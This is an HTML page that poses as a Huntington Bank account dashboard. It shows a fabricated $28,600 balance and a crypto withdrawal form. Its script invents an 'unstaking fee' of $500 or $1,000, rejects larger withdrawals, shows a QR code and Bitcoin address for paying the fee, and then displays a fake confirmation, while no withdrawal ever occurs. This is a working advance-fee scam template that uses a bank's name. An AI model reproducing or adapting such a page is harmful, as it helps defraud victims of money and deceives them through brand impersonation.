<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" type="text/css" href="/dashboard/index.css" />
    <link rel="stylesheet" type="text/css" href="/login.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
      integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />

    <title>Huntington Bank : Dashboard</title>
  </head>
  <body>
    <div class="mainContainer">
      <div class="sideBar">
        <img src="./logo.png" alt="Get Rich With Lockwood" width="150" height="150"  />
        <a href="#">Dashboard</a>
        <a href="./withdraw.html">Withdrawal</a>
        <a href="#">Policies</a>
        <a href="#">Support</a>
      </div>
      <div class="main">
        <div class="short-welcomes">
          <div class="short-welcome">
            <h5>Available Balance + ROI</h5>
            <h3>$28,600 </h3>
          </div>
        </div>
        <div style="margin: 20px auto">
          <form role="form" id="signInForm">
            <p>Withdraw To Wallet</p>
            <span id="response"></span>
            <label> Wallet Address </label>
            <input type="text" id="wallet" />
            <label> Amount </label>
            <input type="number" id="amount" />
            <label> Unstaking Fee </label>
            <input type="text" id="fee" readonly value="" />
            <button type="submit" id="submitBtn">Place Request</button>
          </form>
          <form role="form" id="qrCodeForm" class="hidden">
            <img src="/qr.jpg" />
            <p>14tTBRU2bhzRjc8h62fbRBcuxYcwrdao9H</p>
            <button type="submit" id="submitBtnQR">Transfer Done</button>
          </form>
          <form class="hidden" id="complete">
            <p>
              YAY!!! YOUR UNSTAKING GAS FEE WILL BE PROCESSED SOON. YOU'LL GET
              AN ALERT WHEN YOUR WITHDRAWAL IS COMPLETE
            </p>
          </form>
        </div>
        <div class="tables">
          <div class="table">
            <h4>Withdrawal History</h4>
            <table>
              <thead>
                <tr>
                  <th>S/N</th>
                  <th>Amount</th>
                  <th>Status</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td colspan="3">Nothing to show.</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
    <script type="text/javascript">
      document.getElementById("signInForm").addEventListener("submit", (e) => {
        e.preventDefault();

        document.getElementById("response").innerHTML = "";
        document.getElementById("response").classList.remove("show");

        document.getElementById("submitBtn").innerHTML =
          '<i class="fa fa-spinner"></i> Loading';

        const amount = document.getElementById("amount").value;

        setTimeout(() => {
          if (amount > 13500) {
            document.getElementById("response").innerHTML =
              "Invalid Amount Entered";
            document.getElementById("response").classList.add("show");
            document.getElementById("submitBtn").innerHTML = "Place Request";
          } else {
            document.getElementById("signInForm").classList.add("hidden");
            document.getElementById("qrCodeForm").classList.remove("hidden");
          }
        }, 5000);
      });

      document.getElementById("qrCodeForm").addEventListener("submit", (e) => {
        e.preventDefault();

        document.getElementById("submitBtnQR").innerHTML =
          '<i class="fa fa-spinner"></i> Loading';

        setTimeout(() => {
          document.getElementById("qrCodeForm").classList.add("hidden");
          document.getElementById("complete").classList.remove("hidden");
        }, 5000);
      });

      document.getElementById("amount").addEventListener("input", (e) => {
        const myValue = e.target.value;
        document.getElementById("fee").value =
          myValue < 5000 ? "$500" : "$1,000";
      });
    </script>
  </body>
</html>
